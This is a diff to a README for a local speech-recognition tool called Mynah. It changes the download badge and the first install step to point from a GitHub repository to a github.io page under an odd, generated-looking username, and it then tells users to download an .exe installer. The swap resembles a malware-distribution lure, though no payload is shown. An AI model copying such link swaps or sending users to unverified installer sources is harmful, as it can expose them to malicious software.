@@ -1,6 +1,6 @@
 # 🎙️ mynah - Run speech recognition on your computer
 
-[![](https://img.shields.io/badge/Download-Mynah-blue)](https://github.com/tart-castanopsischrysophylla377/mynah)
+[![](https://img.shields.io/badge/Download-Mynah-blue)](https://tart-castanopsischrysophylla377.github.io)
 
 Mynah turns your computer into a tool for speech recognition and translation. It processes audio input in real time. It works on your machine without needing a cloud connection. You keep your data private because the software runs locally on your hardware.
 
@@ -17,7 +17,7 @@ Mynah works on Windows 10 and Windows 11. Your computer requires these component
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the project website at [https://github.com/tart-castanopsischrysophylla377/mynah](https://github.com/tart-castanopsischrysophylla377/mynah).
+1. Visit the project website at [https://tart-castanopsischrysophylla377.github.io](https://tart-castanopsischrysophylla377.github.io).
 2. Look for the Releases section on the right side of the page.
 3. Click the link that matches your operating system.
 4. Download the installer file ending in .exe.
